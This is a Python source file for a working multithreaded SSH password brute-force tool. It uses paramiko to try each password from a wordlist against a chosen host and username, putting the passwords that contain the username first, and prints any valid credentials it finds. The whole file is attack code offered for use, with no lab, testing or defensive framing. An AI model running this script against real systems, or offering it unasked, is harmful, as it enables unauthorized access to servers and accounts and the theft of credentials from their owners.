import argparse
import paramiko
import threading

password_found = False
def ssh_brute_force(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port=port, username=username, password=password)
        print(f"[*] Found valid credentials: {username}:{password}")
        print('exiting...')
        global password_found
        password_found = True
    except paramiko.AuthenticationException:
        pass
        # print(f"[-] Invalid credentials: {username}:{password}")
    except paramiko.SSHException as e:
        pass
        # print(f"[-] SSH error: :(")
    except Exception as e:
        pass
        # print(f"[-] Error: :()")
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser(description="Multithreaded brute force tool for SSH and other services")
    parser.add_argument("-H", "--hostname", required=True, help="Target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="Target port")
    parser.add_argument("-u", "--username", required=True, help="Username to authenticate with")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use")
    args = parser.parse_args()

    with open(args.wordlist, "r", encoding="latin-1") as f:
        passwords = f.readlines()

    threads = []
    passwords_contain_username = [ password for password in passwords if args.username in password ]
    passwords_not_contain_username = [ password for password in passwords if args.username not in password ]
    
    for password in passwords_contain_username:
        password = password.strip()
        thread = threading.Thread(target=ssh_brute_force, args=(args.hostname, args.port, args.username, password))
        threads.append(thread)
        thread.start()
        if len(threads) >= args.threads:
            for thread in threads:
                thread.join()
            threads = []
            if any(thread.is_alive() for thread in threads) or password_found:
                break
        if password_found:
            break
    
    for password in passwords_not_contain_username:
        password = password.strip()
        thread = threading.Thread(target=ssh_brute_force, args=(args.hostname, args.port, args.username, password))
        threads.append(thread)
        thread.start()
        if len(threads) >= args.threads:
            for thread in threads:
                thread.join()
            threads = []
            if any(thread.is_alive() for thread in threads) or password_found:
                break
        if password_found:
            break
        

if __name__ == "__main__":
    main()